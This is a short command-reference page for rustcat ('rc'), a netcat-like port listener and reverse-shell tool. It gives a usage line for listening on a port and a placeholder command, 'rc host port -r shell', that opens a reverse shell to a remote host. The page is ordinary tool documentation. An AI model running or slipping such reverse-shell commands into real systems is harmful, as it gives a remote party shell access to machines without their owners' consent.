<h1 id="rc">rc</h1>

<p>A modern simplistic port listener &amp; reverse shell.
Similar to <code class="language-plaintext highlighter-rouge">nc</code>.
More information: <a href="https://github.com/robiot/rustcat/wiki/Basic-Usage">https://github.com/robiot/rustcat/wiki/Basic-Usage</a>.</p>

<ul>
  <li>Start listening on a specific port:</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">rc -lp </code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">port</span></p>

<ul>
  <li>Start a reverse shell:</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">rc </code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">host</span><code class="language-plaintext highlighter-rouge"> </code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">port</span><code class="language-plaintext highlighter-rouge"> -r </code><span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">shell</span></p>
